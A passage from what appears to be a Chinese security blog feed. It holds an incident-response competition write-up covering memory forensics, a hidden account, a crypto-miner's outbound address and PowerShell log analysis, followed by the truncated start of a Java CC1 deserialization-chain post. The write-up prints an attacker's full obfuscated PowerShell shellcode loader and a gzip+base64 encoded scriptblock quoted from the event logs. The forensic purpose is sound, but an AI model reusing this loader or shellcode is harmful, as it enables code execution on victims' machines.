title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;GalaxManager_2012&#125;</span><br></pre></td></tr></table></figure><h3 id="内存取证-4"><a href="#内存取证-4" class="headerlink" title="内存取证-4"></a>内存取证-4</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目文件：SERVER-2008-20241220-162057</span><br><span class="line">请找到攻击者创建的用户</span><br><span class="line">flag格式 flag&#123;xxxx&#125;</span><br></pre></td></tr></table></figure><p>获取注册表中的用户即可，很简单。</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229111905095.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone.exe -f H:\应急响应比赛\【题目】小题+综合题\solar\SERVER-2008-20241220-162057\SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 printkey  -K  &quot;SAM\Domains\Account</span><br><span class="line">\Users\Names&quot;</span><br></pre></td></tr></table></figure><p>直接试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ASP.NET&#125;</span><br></pre></td></tr></table></figure><h3 id="内存取证-5"><a href="#内存取证-5" class="headerlink" title="内存取证-5"></a>内存取证-5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目文件：SERVER-2008-20241220-162057</span><br><span class="line">请找到攻击者利用跳板rdp登录的时间</span><br><span class="line">flag格式 flag&#123;2024/01/01 00:00:00&#125;</span><br></pre></td></tr></table></figure><p><strong>方法一：</strong></p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229112051539.png" class="" title="图片引用方法一"><p>可以找到进程1908，但是这里没有时间。</p><p>那么接下来我们看看进程。</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229112208817.png" class="" title="图片引用方法一"><p><strong>PID（Process ID）</strong></p><ul><li><strong>定义</strong>：PID 是操作系统分配给每个运行中进程的唯一标识符。每个进程在系统中都有一个唯一的 PID，用于标识进程。</li><li><strong>作用</strong>：PID 用于区分不同的进程，是系统内核跟踪和管理进程的重要方式。每当一个新的进程被创建时，操作系统会为其分配一个唯一的 PID。</li><li><strong>示例</strong>：如果你通过命令（如 <code>ps</code> 或 <code>top</code>）查看进程列表，你会看到每个进程对应的 PID。比如，PID 为 1234 的进程可能是一个正在运行的程序。</li></ul><p><strong>PPID（Parent Process ID）</strong></p><ul><li><strong>定义</strong>：PPID 是一个进程的父进程的 PID。换句话说，PPID 指的是启动当前进程的进程的标识符。每个进程（除了初始化进程）都有一个父进程。</li><li><strong>作用</strong>：PPID 显示了当前进程与其父进程的关系。操作系统使用 PPID 来管理进程之间的层级关系，当一个进程退出时，它的子进程可能会被重新分配给另一个父进程（通常是 <code>init</code> 进程）。</li><li><strong>示例</strong>：假设进程 PID 为 1234 的进程是由 PID 为 5678 的进程启动的，那么进程 1234 的 PPID 就是 5678。</li></ul><p>但是这里两个试了都不行</p><p>后来才知道</p><p><strong>UTC+0000</strong> 是一种表示时间偏移量的格式，用于说明某个时间与协调世界时（UTC，Universal Time Coordinated）的关系。</p><p><strong>UTC+0000</strong> 表示没有时间偏移的协调世界时，常用于不受时区影响的场合。</p><p>中国使用的时区是 <strong>中国标准时间（CST）</strong>，也被称为 <strong>北京时间</strong>。其时区偏移量是 <strong>UTC+08:00</strong>，也就是说，中国的时间比协调世界时（UTC）快 8 小时。</p><p>所以要加8小时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2024/12/21 00:15:34&#125;</span><br></pre></td></tr></table></figure><p><strong>方法二：</strong></p><p>我们在filescan文件中可以找到Windows日志文件Security.evtx，<strong>注意大写</strong></p><p><code>security.evtx</code> 是 Windows 操作系统中的一个事件日志文件，主要记录与系统安全相关的事件信息。它是 Windows 日志文件的一部分，用于存储关于用户登录、账户管理、安全审计、系统访问控制等事件的数据。</p><p>攻击者利用跳板rdp登录受害机，那么windows日志肯定会有相关记录。</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229113321749.png" class="" title="图片引用方法一"><p>我们把它dump下来</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229113401080.png" class="" title="图片引用方法一"><p>dump下来后缀改成evtx就行，然后放到宝瓜分析！</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229113532493.png" class="" title="图片引用方法一"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229113556890.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2024/12/21 00:15:34&#125;</span><br></pre></td></tr></table></figure><h3 id="内存取证-6"><a href="#内存取证-6" class="headerlink" title="内存取证-6"></a>内存取证-6</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目文件：SERVER-2008-20241220-162057</span><br><span class="line">请找到攻击者创建的用户的密码哈希值</span><br><span class="line">flag格式 flag&#123;XXXX&#125;</span><br></pre></td></tr></table></figure><p>创建的用户是ASP.NET</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229122231066.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5ffe97489cbec1e08d0c6339ec39416d&#125;</span><br></pre></td></tr></table></figure><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>这里我们先获取虚拟机administrator用户的密码</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229132342981.png" class="" title="图片引用方法一"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229132335459.png" class="" title="图片引用方法一"><h3 id="数据库-1"><a href="#数据库-1" class="headerlink" title="数据库-1"></a>数据库-1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目附件：mssql、mssql题-备份数据库</span><br><span class="line">请找到攻击者创建隐藏账户的时间</span><br><span class="line">flag格式 如 flag&#123;2024/01/01 00:00:00&#125;</span><br></pre></td></tr></table></figure><p>给了vmdk和ovf，可以用vmware打开和取证</p><p><strong>VMDK</strong> 是一种文件后缀，代表 <strong>Virtual Machine Disk</strong>，是一种虚拟磁盘文件格式。它由 VMware 开发，用于存储虚拟机的硬盘内容</p><p>先打开看看，发现需要密码，那么！取证大师！启动！</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229130911566.png" class="" title="图片引用方法一"><p>在 Windows 中，账户名以 <strong><code>$</code></strong> 结尾的通常表示隐藏的共享或资源。</p><p>只有一个test$</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;test$&#125;</span><br></pre></td></tr></table></figure><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229131325621.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2024-12-16 15:24:21</span><br></pre></td></tr></table></figure><p>密码设置时间很有可能就是创建用户的时间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2024/12/16 15:24:21&#125;</span><br></pre></td></tr></table></figure><p>不仅取证大师可以发现隐藏用户，这里也可以compmgmt.msc</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229132651247.png" class="" title="图片引用方法一"><h3 id="数据库-2"><a href="#数据库-2" class="headerlink" title="数据库-2"></a>数据库-2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目附件：mssql、mssql题-备份数据库</span><br><span class="line">请找到恶意文件的名称</span><br><span class="line">flag格式 如 flag&#123;*.*&#125;</span><br></pre></td></tr></table></figure><p>上传火绒剑分析</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229133350472.png" class="" title="图片引用方法一"><p>发现c盘java目录下有一个xmrig.exe，有远程地址和本地地址的连接，猜测是恶意后门文件！</p><p>百度一下看看</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229133446413.png" class="" title="图片引用方法一"><p>塌房了！！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;xmrig.exe&#125;</span><br></pre></td></tr></table></figure><h3 id="数据库-3"><a href="#数据库-3" class="headerlink" title="数据库-3"></a>数据库-3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目附件：mssql、mssql题-备份数据库</span><br><span class="line">请找到恶意文件的外联地址</span><br><span class="line">flag格式 如 flag&#123;1.1.1.1&#125;</span><br></pre></td></tr></table></figure><p>外链地址，简单，上面有了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">203.107.45.167:3333</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;203.107.45.167&#125;</span><br></pre></td></tr></table></figure><h3 id="数据库-4"><a href="#数据库-4" class="headerlink" title="数据库-4"></a>数据库-4</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目附件：mssql、mssql题-备份数据库</span><br><span class="line">请修复数据库</span><br><span class="line">flag格式 如 flag&#123;xxxxx&#125;</span><br></pre></td></tr></table></figure><p>修复数据库？？？</p><h3 id="数据库-5"><a href="#数据库-5" class="headerlink" title="数据库-5"></a>数据库-5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目附件：mssql、mssql题-备份数据库</span><br><span class="line">请提交powershell命令中恶意文件的MD5</span><br><span class="line">flag格式 如 flag&#123;xxxxx&#125;</span><br></pre></td></tr></table></figure><p>powershell命令，看日志</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229134458850.png" class="" title="图片引用方法一"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229134531627.png" class="" title="图片引用方法一"><p>发现存在大量远程命令执行，我们逐个分析</p><p>在后面几个发现了比较特殊的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- EventData </span><br><span class="line"></span><br><span class="line">  MessageNumber 1 </span><br><span class="line">  MessageTotal 1 </span><br><span class="line">  ScriptBlockText function tWk &#123; Param ($k0M, $ybp) $f2w = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\\&#x27;)[-1].Equals(&#x27;System.dll&#x27;) &#125;).GetType(&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;) return $f2w.GetMethod(&#x27;GetProcAddress&#x27;, [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($f2w.GetMethod(&#x27;GetModuleHandle&#x27;)).Invoke($null, @($k0M)))), $ybp)) &#125; function lVhI5 &#123; Param ( [Parameter(Position = 0, Mandatory = $True)] [Type[]] $v8K8, [Parameter(Position = 1)] [Type] $nZWM = [Void] ) $p8dl = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#x27;ReflectedDelegate&#x27;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false).DefineType(&#x27;MyDelegateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate]) $p8dl.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]::Standard, $v8K8).SetImplementationFlags(&#x27;Runtime, Managed&#x27;) $p8dl.DefineMethod(&#x27;Invoke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $nZWM, $v8K8).SetImplementationFlags(&#x27;Runtime, Managed&#x27;) return $p8dl.CreateType() &#125; [Byte[]]$tUZml = [System.Convert]::FromBase64String(&quot;/EiD5PDozAAAAEFRQVBSUUgx0lZlSItSYEiLUhhIi1IgTTHJSItyUEgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGESLQCBJAdBQ41ZI/8lNMclBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYQVheSAHQWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAG9wKiu3EFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V&quot;) [Uint32]$uKrz = 0 $rS = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tWk kernel32.dll VirtualAlloc), (lVhI5 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $tUZml.Length,0x3000, 0x04) [System.Runtime.InteropServices.Marshal]::Copy($tUZml, 0, $rS, $tUZml.length) if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tWk kernel32.dll VirtualProtect), (lVhI5 @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($rS, [Uint32]$tUZml.Length, 0x10, [Ref]$uKrz)) -eq $true) &#123; $yfm6I = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tWk kernel32.dll CreateThread), (lVhI5 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$rS,[IntPtr]::Zero,0,[IntPtr]::Zero) [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tWk kernel32.dll WaitForSingleObject), (lVhI5 @([IntPtr], [Int32]))).Invoke($yfm6I,0xffffffff) | Out-Null &#125;  </span><br><span class="line">  ScriptBlockId 6272cc91-9ab4-4901-8088-ca946f7ae722 </span><br><span class="line">  Path  </span><br></pre></td></tr></table></figure><p>关注此处：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[System.Convert]::FromBase64String(&quot;/EiD5PDozAAAAEFRQVBSUUgx0lZlSItSYEiLUhhIi1IgTTHJSItyUEgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGESLQCBJAdBQ41ZI/8lNMclBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYQVheSAHQWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAG9wKiu3EFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- EventData </span><br><span class="line"></span><br><span class="line">  MessageNumber 1 </span><br><span class="line">  MessageTotal 1 </span><br><span class="line">  ScriptBlockText &amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((&#x27;H4sICBPmW2cAA3Rlc3QudHh0ALVXbXOiSBD+7q+gtqwSKkYwcXNuqrbqQFExkpWgGHWtKwIDzDKAC0OU7O1/vx58SVJJdvfuaucLzkx3T8/TT3ePXh47FCcxR2ch963C7cfYTu2I46uhpNe5anG3Fo5bVe9sw33k+KW8XneTyMbx6vKyk6cpiulu3ugjKmcZiu4IRhkvcH9zswCl6PTT3RfkUO4bV/2r0SfJnU32YkXHdgLEncqxy/ZGiWMzpxrmmmDK1z5/rgnL0+aqoX7NbZLxNbPIKIoaLiE1gfsusAMnxRrxNR07aZIlHm3McHx+1pjGme2ha7B2j3REg8TNakLleJcU0TyNyysxGzsJvgY/x2niyK6boiyr1bkls75crf7kl/ujb/KY4gg1tJiiNFmbKL3HDsoaAzt2CbpB3gq0TJri2F8JAojdJyHiq3FOSJ37N2b4a7Q5APerSvxTJZAa01SoQzRfXlNP3JygnWLtFT8ZAQQYexIIle+VinegDLEC7f1L0hznh7EsNxA4y4+TDJe6Hzmpzulwrk2TtIBpdZLmSFgdoeaq9+2rdv0XjTUPmqAXL2Y6LC2tBLuro/6TqFfXbZcwibcZ3EUejlG3iO0IOweS8q/FAnkElXA0DmLX4B5f228gt4sI8m3K4GWUeKGmRpgedZUcExelsgPxzMArCLXw3JldxPiaFusoAuh2c+Bo1YPUQAfpfToUh9PZHIRqHWJnWZ0b55CbTp0zkU2QW+fkOMP7LTmnSfmz9uiunhOKHTujB3Mr4Tma+1M7SZzRNHcgpoDAxFwjB9uEAVLnBthFSmFi/3B67VU4OjYhkDRg6R7CASsMBpMypqTgaMkKoWEiqkVrgiKQKUtFj9g+FIZ9apTUsn3k1l7385ABO7ozXA6APPESgm2ShNY5C6cU6g7DmHHrvzjxouKUznRStA8NX2bWUiko436VThdRydA9PiUaKQUkemkSKXaGLlq74sK/E1XcfT/uJg8yDLV3Y1iKOZ36W4ksiKlRc67i0TQINNzU/MlkMIS1Yqr6Yyqtr8zuQE6728CTtUxTB0phNBXZGeA/rKEynYIe7oyML1tNdpXIv/XnnY02Dm41OKgz8jUfvooWOIq0kHxF0qjWV82R0VGGIG+0mgtNbJNr3SEKfjA1Ux7M2HmGMxh27S2co7Zag9vtRL7Wh3LQ++T2mme9QMWSHJrGwFiE/VFXLecOmxvzTMVqb25YAQJbxsxaKzO1tzCsteafbHzDGomtXqDAuoa3o7Upwmg2h/ex+6CT9oMO7hrWYojRQvNR4cuGLJvzmJh3m44s9z9srnB+rvamsBZOtHhr3K11t5gPxA+WjtE6kQ1VlnsEMjSS7U1XbM6SK8N6b0xVaVtMpe1G/SJuVDzchPvvtH9x4YteayxaphYP7EABf4thK8TDE9iLbEuae6LF8OuEsfgQ35KLoV5iCvcxQAezeNn+DejtdGQaa7eiaPmiL3vE0vy24d8m8Zkdgu2ZL4OHcEeItTfUGO45weH05FZsTsEfKRpuJeZrNGyDvbPwFZtmAPi6C1tWmB/KrJ/Is7B/0SnaYx3uYTXBZmzlk9kAbILPedhmMEM8umYn7pva7Zl7d6OIJ+7c9pWF6Xid9miGrXvReidUllMc0/OzVTW/Sh9YC6hUU/MJzd9qbLqdZoFNgP7Qsg4lqJekvX0nGieYafA8e8SEKI0Rgd4Pr4ND6sqEJA5rgbuWBf131xVZk55qpU+v/RK4o6Dw2BwPS5eXC/ASqkGZrY0Rin0a1KXtuSRBb5O2Ugvy/tev1knWBb+zVWfNEaA52ialbaGCPY7/6dvhf6MFbx8K1fgHeL0FHZwdQvmEcr4ragxAJUnIU/jKex2Z8Aw7AK0JN1+yd0/JETBwir4CCuxt8OSlUS286EL7rczZ1+YAPu5PmfO49oPdX2KTVGf4vFh8vvDY1H7f/Wc2piBoQo8haPfmeQOGfa48iXAZHcgEbz/YP4BPOT29hlcl9Ll/ADmiosV0DAA&#123;0&#125;&#x27;)-f&#x27;A&#x27;,&#x27;f&#x27;,&#x27;M&#x27;)))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd())) </span><br><span class="line">  ScriptBlockId 5ef6ec2a-3ad1-4051-8fba-a804b7bddefb </span><br><span class="line">  Path  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>稍微问一下AI</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229135320255.png" class="" title="图片引用方法一"><p>其实自己也看得出来，其中的关键VirtualProtect，Invoke，kernel32.dll其实可以猜出来，相当于免杀的混淆，base64解码后执行shellcode。</p><p>同时也发现了System.IO.Compression.GzipStream</p><p>根据时间判断，应该是先gz压缩，再base64</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229135841104.png" class="" title="图片引用方法一"><p>导出看看</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229140034813.png" class="" title="图片引用方法一"><p>导出为bin文件然后丢微步之类的看看。</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229140152237.png" class="" title="图片引用方法一"><p>恶意文件实锤了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d72000ee7388d7d58960db277a91cc40&#125;</span><br></pre></td></tr></table></figure><h2 id="综合应急"><a href="#综合应急" class="headerlink" title="综合应急"></a>综合应急</h2><h3 id="综合应急-1"><a href="#综合应急-1" class="headerlink" title="综合应急-1"></a>综合应急-1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目文件：FOG日志</span><br><span class="line">综合应急-1请点击左上角“CTF”按钮切换为“知识竞赛”进行答题。题目类型为选择题，提交机会只有一次，请慎重提交。</span><br><span class="line">本题 flag答案为flag&#123;solar&#125;</span><br></pre></td></tr></table></figure><h3 id="综合应急-2"><a href="#综合应急-2" class="headerlink" title="综合应急-2"></a>综合应急-2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目文件：FOG日志</span><br><span class="line">攻击者上传了代理工具，请写出他的最终存放路径</span><br><span class="line">格式为flag&#123;x:\xxxxx\xxxx\xxxxxx&#125;</span><br></pre></td></tr></table></figure><p>FOG 是一个用于部署计算机镜像的管理工具，特别是在网络中快速部署操作系统和应用程序。通过 FOG，管理员可以对计算机进行远程安装、恢复和管理。这对于大规模部署、维护和备份计算机非常有用。</p>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化CC1链分析</title>
      <link href="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/"/>
      <url>/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="CC1链-分析"><a href="#CC1链-分析" class="headerlink" title="CC1链 分析"></a>CC1链 分析</h1><p><strong>环境要求：jdk8u65，Commons-Collections 3.2.1</strong></p><ul><li>首先我们再次明确一下反序列化的攻击思路。</li></ul><p>入口类这里，我们需要一个 <code>readObject</code> 方法，结尾这里需要一个能够命令执行的方法。我们中间通过链子引导过去。所以我们的攻击一定是从尾部出发去寻找头的，流程图如下。</p><img src="https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/AttackRoad.png" alt="img" style="zoom:80%;" /><p><strong>Common-Collections介绍</strong></p><p><a href="http://commons.apache.org/">Apache Commons</a>是Apache软件基金会的项目，曾经隶属于<code>Jakarta</code>项目。<code>Commons</code>的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：<code>Proper</code>（是一些已发布的项目）、<code>Sandbox</code>（是一些正在开发的项目）和<code>Dormant</code>（是一些刚启动或者已经停止维护的项目）。</p><ul><li>简单来说，Common-Collections 这个项目开发出来是为了给 Java 标准的 <code>Collections API</code> 提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。</li></ul><h2 id="终点-利用点"><a href="#终点-利用点" class="headerlink" title="终点-利用点"></a>终点-利用点</h2><p>CC1链的源头就是Commons Collections库中的Tranformer接口，这个接口里面有个transform方法。</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241105194118934.png" class="" title="This is an example image"><p>快捷键ctrl+alt+B，查看实现接口的类</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241105194436449.png" class="" title="This is an example image"><p>我们这里找到了有重写transform方法的InvokerTransformer类，并且可以看到它也继承了Serializable,很符合我们的要求。</p><p>下面给出InvokerTransformer类的构造器和重写的transform方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 